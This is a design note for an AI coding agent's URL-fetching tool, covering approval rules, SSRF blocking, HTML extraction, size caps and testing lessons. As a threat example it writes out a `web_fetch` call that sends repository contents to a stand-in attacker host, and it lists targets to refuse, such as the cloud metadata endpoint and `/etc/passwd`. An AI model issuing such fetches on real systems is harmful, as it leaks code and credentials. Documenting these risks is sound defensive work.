# v0.2c — `web_fetch`, and closing the tool surface

**Status: complete and verified against real pages.** 573 tests, all gates green. The tool surface is
now all seven.

**Goal:** the seventh tool. Aiden can read a URL and get back text it can reason about, without
handing the agent an unbounded network primitive.

Two things make this different from the other six tools, and both are about what a URL *is*:

1. **A URL is an exfiltration channel.** `web_fetch("https://evil.example/?d=<repo contents>")` looks
   like a read. An opaque string that reaches the network is exactly the "unprovable ⇒ ask" case the
   command policy already establishes.
2. **A URL can reach the machine it runs on.** `http://169.254.169.254/` is a cloud metadata
   endpoint; `http://localhost:8080/` is whatever the user is running. Fetching those is SSRF.

**Not in this milestone:** the second-model compressor. `architecture` §9 lists "`web_fetch` gets a
small model to compress" as an RLM invariant, and it is still the right idea — but it needs async
tools plus nested cost attribution, which is its own milestone. The output budget makes the raw case
acceptable first. Trigger to build it: an eval task where a fetched page's *extraction* is the
bottleneck.

## 1. Decisions

| Decision | Choice | Why |
|---|---|---|
| Approval | **Every fetch asks**, unless the host matches `AIDEN_FETCH_ALLOW` | A URL is opaque, so nothing about it is provable. An allowlist removes the prompt fatigue that would otherwise train the user to click yes |
| Non-interactive | **Denied**, like writes | A piped run has nobody to ask, and a fetch is outward-facing |
| SSRF | Refuse loopback, link-local, private ranges, `.internal`, and non-http(s) schemes, **after** DNS resolution | Checking the hostname string alone is defeated by a name that resolves to `127.0.0.1` |
| Extraction | **stdlib `html.parser`**, HTML → markdown-ish text | No new dependency for a job a focused extractor does well: drop script/style, prefer `<article>`/`<main>`, keep headings, lists, code, links |
| Output | 16 KB budget, spill past 4× | Same discipline as every other tool |
| Response size | Stop reading past 2 MB | A 500 MB response is a denial of service, not a document |
| Repeated fetches | Cached per session | Fetching the same doc twice is waste, and the cache is free |
| Blocking | Sync HTTP, one at a time | Tools are sync; rendering is event-driven, so nothing repaints during a tool call anyway. Documented rather than pretended |

## 2. What is refused, and the reason the user sees

```
non-http(s) scheme      -> refused: file:, ftp:, data: are not fetchable
loopback / private IP   -> refused: reaches this machine or its network
metadata endpoints      -> refused: cloud instance credentials live at 169.254.169.254
non-text content type   -> refused: application/octet-stream is not readable text
response over 2 MB      -> refused: truncated at 2 MB, and says so
```

| Step | Deliverable | Test |

| 3 | `aiden/tools/webfetch.py`: fetch, size cap, timeout, extraction, budget, session cache | `httpx.MockTransport` — no network in tests |

## 4. What testing against real pages found

The unit tests passed while the extraction was still bad, which is the useful lesson: the fixtures
were shaped like the extractor rather than like the web.

1. **`<article>`/`<main>` are not where content lives.** Sphinx — and most docs generators — put the
   article in a plain `<div>` and the navigation in another. Preferring named elements meant a fetch
   of `pathlib` opened with `Navigation`, `next`, `previous` and a breadcrumb, and because output is
   capped, that chrome pushed the actual API reference out of the window.
2. **A container always beats the article inside it**, since it holds the same text plus the chrome —
   so a sidebar ended up in the output even when `<article>` *was* used. Fixed by penalising link
   text (navigation is nearly all links) and breaking near-ties toward the most specific region.
3. **Entities survived in the title.** `convert_charrefs` decodes character references in text nodes
   but does not reach a regex, so every fetch header showed `&#8212;` instead of an em dash.
4. **`<pre>` indentation was being stripped** by a global whitespace tidy-up — the one place in HTML
   where leading spaces are content rather than formatting.

Two of these were only visible on a real page, which is why the acceptance criterion was "fetch a
real documentation page" rather than "the fixtures pass".

## 5. A bug in shared code, found from here

`cap_text`'s "keep at least one line" fallback returned the **whole** line when nothing fitted, so a
single very long line defeated the byte budget. That helper is used by every tool, so `read` on a
minified file had the same hole. It now cuts the line to the budget; `tests/test_tools.py` pins it.

## 6. Acceptance

1. A real documentation page fetches and returns readable text with its code blocks and headings.
2. `http://localhost:8080`, `http://169.254.169.254/`, and `file:///etc/passwd` are all refused with
   a reason, and refused *before* any request is made.
3. A 5 MB page is capped, and the result says what was dropped.
4. Two fetches of the same URL in one session make one request.
5. A non-interactive run cannot fetch without `--allow-writes` or an allowlisted host.
6. The gate test suite proves the policy, not the presence of a string in the source.
